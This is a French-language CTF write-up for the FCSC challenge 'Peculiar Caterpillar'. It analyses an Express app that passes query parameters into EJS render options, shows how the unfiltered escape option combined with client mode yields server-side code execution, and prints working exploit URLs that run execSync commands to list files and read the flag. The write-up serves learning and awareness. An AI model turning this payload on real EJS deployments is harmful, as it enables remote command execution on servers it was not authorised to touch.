 # Peculiar Caterpillar
 
**Auteur: Lxt3h**

## Présentation
Bonjour je m'appelle (Lxt3h), je suis actuellement étudiant à XXXX en 2ème année (équivalent master 1). Etant alternant Reverse Engineer (reverse de protection anti bot), j'audit couramment des technologies web. Sur mon temps personnel, je pratique essentiellement du reverse engineering bas niveau.

Je participe souvent à des CTF pour m'amuser et pour apprendre de nouveau concepts.


## Analyse du code
Nous allons commencer par une première analyse du code fournit par l'auteur du challenge.

<center>
<img src="https://i.imgflip.com/7juz1p.jpg">
</center>


index.js
```js
require("express")().set("view engine", "ejs").use((req, res) =>  res.render("index", {
	name:  "World",
	...req.query
})).listen(3000);
```

Globalement ce script ne fait qu'importer express, configure le moteur de template **ejs** et renvoie une vue sur le fichier index.ejs tout envoyant un objet contenant `...req.query` avec une variable **name** qui sera interprété au rendu par EJS pour l'afficher sur la template index.

Je note un point d'entrée avec le `...req.query` . En effet, ce qu'il se passe à ce moment c'est que l'application ne contrôle pas les données rentrées par l'utilisateur et envoie directement cela au rendu.

A ce moment là j'avais deux idées, soit nous avions affaire à du prototype pollution, soit une SSTI.
## Plan d'attaque

Pour commencer, j'ai regardé si EJS avait une CVE récente. Par chance, j'ai trouvé la CVE-2022-29078 qui est une SSTI dans une des options évaluée au moment du rendu d'EJS. Je suis partie sur des idées un peu farfelu, notamment le fait que je puisse essayer d'injecter un payload depuis name, mais j'ai vite abandonné l'injection de paramètres en aveugle.

J'ai décidé de me lancer dans la découverte du code source EJS.

 - Analyser le patch de la CVE-2022-29078
 - Prendre en main le code source d'EJS
 - Analyser le système de rendu afin de trouver des erreurs de parsing ou des injections.

## Analyse du code EJS

Je n'ai trouvé aucun article à ce sujet, j'ai du fouiller dans l'entièreté du script afin d'aboutir à une vulnérabilité.

Pour commencer, j'ai analysé le contexte vulnérable que la CVE-2022-29078 exploitait.
**Code vulnérable:**
```js
prepended += ' var __output = "";\n' + ' function __append(s) { if (s !== undefined && s !== null) __output += s }\n'; 
if (opts.outputFunctionName) { 
	prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\n'; 
}
```
**Code patché:**
```js
prepended +=

' var __output = "";\n' +

' function __append(s) { if (s !== undefined && s !== null) __output += s }\n';

	if (opts.outputFunctionName) {

		if (!_JS_IDENTIFIER.test(opts.outputFunctionName)) {

				throw new Error('outputFunctionName is not a valid JS identifier.');

		}

		prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\n';

	}
```

On peut voir que l'application vérifie notre entrée via une regex.

**Regex:**
```js
var _JS_IDENTIFIER = /^[a-zA-Z_$][0-9a-zA-Z_$]*$/;
```

**Permissions de la regex:**

 - Caractères alphanumériques
 - $ et _
 - Du début à la fin de la string
 
Les permissions sont trop restrictives, nous ne pourrons injecter de payload. Etant donné que nous pouvons envoyer n'importe quel paramètre URL à EJS, nous avons la possibilité d'écraser des valeurs de configuration EJS.

J'ai donc cherché dans l'entièreté du script d'EJS là ou je pouvais trouver un endroit ou mon pattern était évalué au rendu et surtout non filtré.

J'ai eu énormément de faux espoir durant ma nuit de tryhard, mais en persistant j'ai trouvé un pattern intéressant.

En cherchant quels paramètres dont j'avais le contrôle, j'ai trouvé cette ligne.

```js
if (opts.client) {

	src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;

	if (opts.compileDebug) {

		src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;

	}

}
```

A ce moment, j'ai vu le bout du tunnel. En effet, je pouvais contrôler la valeur de `escapeFn` par l'intermédiaire de `opts.escape`, nous remarquons également que l'entrée n'est pas filtré. Si j'active l'option client et que je met un code javascript arbitraire en paramètre, comment réagirait mon programme ?

<center>
<img src="https://i.imgflip.com/7jwkca.jpg">
</center>

## Exploitation



![](https://cdn.discordapp.com/attachments/858439417743540225/1101669413746393088/image.png)

Ne vous fiez pas à son apparence, il est plus coriace que vous ne le pensez. 

D'après le code source, lorsque nous mettons à **true** l'option de **debug** nous pouvons voir le script généré par le compiler d'EJS cependant comme nous avons vu dans ce code:

```js
if (opts.client) {

	src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';' + '\n' + src;

	if (opts.compileDebug) {

		src = 'rethrow = rethrow || ' + rethrow.toString() + ';' + '\n' + src;

	}

}
```

Pour que notre **escapeFn** s'affiche dans le rendu, il faut tout d'abord activer l'option **client**. 

<center>
<img src="https://cdn.discordapp.com/attachments/858439417743540225/1101680632221929493/image.png"></center>

En activant le mode debug et le client on peut en effet voir la ligne généré par le code ci-dessus.

Maintenant remplaçons la valeur à l'intérieur de **escapeFunc**.

```
https://peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&settings[view+options][escape]=deadbeef&debug=true
```

![](https://cdn.discordapp.com/attachments/858439417743540225/1101681522345513000/image.png)

On peut voir que nous avons une erreur et ce qui est intéressant c'est que notre valeur d'entrée est affichée, cela veut dire que celle-ci à bien été évalué au render. Mais d'ou vient cette erreur?
Il faut comprendre que ce qui est stocké dans **escapeFunc** de base est une fonction javascript qui prend un argument et qui vérifie la présence de caractères html puis retourne la valeur.

<center>
<img src="https://cdn.discordapp.com/attachments/858439417743540225/1101682047619174571/image.png">
</center>

Si l'on regarde plus bas, on voit qu'il passe notre argument **name** dans **escapeFn** mais pas que, il y a également la fonction **rethrow** qui prend en entrée notre fonction.

<center>
<img src="https://cdn.discordapp.com/attachments/858439417743540225/1101682441304936470/image.png">
</center>

 Et si on lit le code source on peut voir qu'il s'agit de la fonction qui trigger les erreurs de rendu, je mets du javascript dans l'option **escapeFunc** maintenant.
 
Etant donné que nous avons une fonction qui prend en paramètre une valeur et la retourne, nous devons recréer cette même fonction.

```
https://peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&settings[view+options][escape]=function(d){return d}
```
![](https://cdn.discordapp.com/attachments/858439417743540225/1101685127047819344/image.png)

Ce qui est intéressant, c'est que nous possédons l'équivalent d'un middleware. Tout ce qui passe dans **name** passe dans notre fameuse fonction, profitons de cela pour exécuter une commande sur le serveur.

> **Remarque:** La fonctionnalité **escapeFn** est conçue pour protéger des XSS, c'est pourquoi nos arguments de rendu passe par **escapeFn**

<center>
<img src="https://i.imgflip.com/7jwrvt.jpg">
</center>

```
https://peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&settings[view+options][escape]=function(d){ return process.mainModule.require('child_process').execSync('ls');}
```
![](https://cdn.discordapp.com/attachments/858439417743540225/1101685686463123476/image.png)

Nous avons redirigé le résultat de notre requête et nous pouvons ainsi lire le fichier du flag.

```
https://peculiar-caterpillar.france-cybersecurity-challenge.fr/?client=true&settings[view+options][escape]=function(d){ return process.mainModule.require('child_process').execSync('cat flag-a49d3e9518ee659fa932482818e7eeeb.txt');}
```
![](https://cdn.discordapp.com/attachments/858439417743540225/1101686109026660362/image.png)

**Flag:** `FCSC{232448f3783105b36ab9d5f90754417a4f17931b4bdeeb6f301af2db0088cef6}`

## Conclusion

J'ai appris énormément de chose durant ce challenge, je suis vraiment fier d'avoir trouver ma vulnérabilité en auditant de font en comble le code source d'EJS.

Et pour conclure cela, contrôlez vos input.

## Remerciement
Je tenais à remercier l'auteur du challenge **Bitk** j'ai énormément apprécié le challenge et la plupart de ses challenges par ailleurs. J'ai trouvé ce CTF très bénéfique pour mon apprentissage alors merci aux organisateurs et aux créateurs des challenges.
 
